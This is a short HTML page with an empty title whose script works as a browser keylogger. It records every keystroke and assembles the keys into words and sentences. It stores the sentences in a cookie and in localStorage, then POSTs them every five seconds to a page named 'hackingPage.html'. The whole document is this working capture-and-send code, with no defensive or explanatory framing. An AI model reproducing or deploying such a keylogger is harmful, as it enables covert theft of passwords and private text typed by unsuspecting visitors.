<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body onload="loadStarter()">

    <script type="text/javascript">

    var saverWord = "";
    var saveSentance = "";

    var sentanceArray = [];

    function loadStarter() {

      console.log("Load");

      setInterval(makeAjaxRequest, 5000);

    };

    document.addEventListener('keydown', function(event) {

      if(event.key.length == 1){
        saverWord += event.key;
        saveSentance += event.key;
      }

      console.log("Key: " + event.key);

      if(event.keyCode == 32 || event.keyCode == 190){
        console.log("Word: " + saverWord);
        saverWord = "";
      }

      if(event.keyCode == 190){
        console.log("Sentance: " + saveSentance);
        sentanceArray.push(saveSentance);
        saveSentance = "";

        document.cookie = "sentances="+ sentanceArray.toString();
        localStorage.setItem('sentances', sentanceArray.toString());
      }

    });

    function makeAjaxRequest() {

      console.log("Sending data to Sever");

      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
         console.log("Success !!!!");
        }
      };

      xhttp.open("POST", "hackingPage.html", true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.send("sentances=" + sentanceArray.toString());

    }

    </script>

  </body>
</html>
